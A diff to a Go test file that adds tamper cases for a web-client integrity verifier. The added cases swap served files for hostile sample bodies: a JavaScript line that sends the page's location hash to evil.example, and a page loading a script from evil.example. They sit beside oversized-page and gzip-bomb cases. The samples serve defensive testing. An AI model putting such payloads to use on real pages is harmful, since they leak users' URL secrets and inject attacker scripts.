@@ -297,6 +297,20 @@ func TestVerifyClientRefusesAChangedClient(t *testing.T) {
 		{"manifest", rewrite(pathIs(webclient.ManifestPath), func(response *served) {
 			response.body = bytes.Replace(response.body, []byte(`"sha256":"`), []byte(`"sha256":"0`), 1)
 		}), "the server's client manifest differs"},
+		{"proxy header beside a changed file", rewrite(pathIs("/assets/index-a1.js"), func(response *served) {
+			response.header.Set("X-Unlisted-Proxy", "1")
+			response.body = []byte("fetch('https://evil.example/'+location.hash)")
+			response.header.Del("Content-Encoding")
+		}), "/assets/index-a1.js: the file differs"},
+		{"operator contact missing beside a changed page", rewrite(pathIs("/terms"), func(response *served) {
+			response.header.Set("Connection-Allowlist", webclient.ConnectionAllowlist(""))
+			response.body = []byte("<!doctype html><script src=https://evil.example/x.js></script>")
+			response.header.Del("Content-Encoding")
+		}), "/terms: the page differs"},
+		{"page larger than any page of the release", rewrite(pathIs("/terms"), func(response *served) {
+			response.body = bytes.Repeat([]byte{'a'}, 2<<20)
+			response.header.Del("Content-Encoding")
+		}), "/terms: client: the server sent a malformed response"},
 		{"gzip bomb", rewrite(browserAsks("/assets/index-a1.js"), func(response *served) {
 			response.body = gzipBytes(t, bytes.Repeat([]byte{'a'}, 16<<20))
 			response.header.Set("Content-Encoding", "gzip")
